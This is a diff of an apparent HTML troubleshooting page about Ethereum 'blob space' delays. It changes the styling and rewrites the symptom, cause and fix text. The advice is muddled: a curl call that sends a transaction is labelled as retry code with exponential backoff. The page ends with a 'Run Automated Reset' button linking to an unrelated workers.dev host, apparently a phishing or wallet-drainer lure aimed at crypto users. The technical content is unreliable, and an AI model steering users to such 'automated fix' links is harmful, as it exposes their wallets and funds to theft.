@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #121214;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff9455;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,32 +42,33 @@
 <h1>Ethereum Blob Space Delay</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a backlog in the blob space, resulting in increased transaction processing times.</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a delay in the Ethereum blob space. The delay can cause transactions to remain in a pending state for an extended period.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to congestion in the Ethereum network's blob space, which is responsible for storing and managing large data blobs associated with transactions, leading to slower transaction processing and confirmations.</li>
+<li>The Ethereum blob space delay occurs when the Ethereum network is congested, causing a backlog of transactions waiting to be processed. This congestion can be due to a high volume of transactions, network issues, or limitations in the Ethereum protocol.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit to prioritize transactions and reduce delay: <code>eth_estimateGas</code></li>
-<li>Utilize layer 2 scaling solutions to offload transactions and reduce network congestion</li>
-<li>Optimize transaction batching to minimize the number of transactions competing for space in the blob</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Increase the gas price to prioritize the transaction</li>
+<li>Use a different Ethereum node or provider to reduce congestion</li>
+<li>Implement a retry mechanism with exponential backoff using the following code:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://mainnet.infura.io/v3/YOUR_PROJECT_ID<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_estimateGas&quot;,&quot;params&quot;:[],&quot;id&quot;:1}&#39;</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;value&quot;:&quot;0x...&quot;}],&quot;id&quot;:1}&#39;</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced troubleshooting and configuration options.</p>
+<p>Consider using an external console for more advanced troubleshooting and to execute the above command. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Ethereum node or client installed and configured</li>
-<li>Basic understanding of Ethereum transaction processing and gas mechanics</li>
-<li>Access to the Ethereum network via a node or provider</li>
+<li>Ethereum node or provider access</li>
+<li>Basic understanding of Ethereum transactions and gas pricing</li>
+<li>Familiarity with curl or a similar HTTP client tool</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
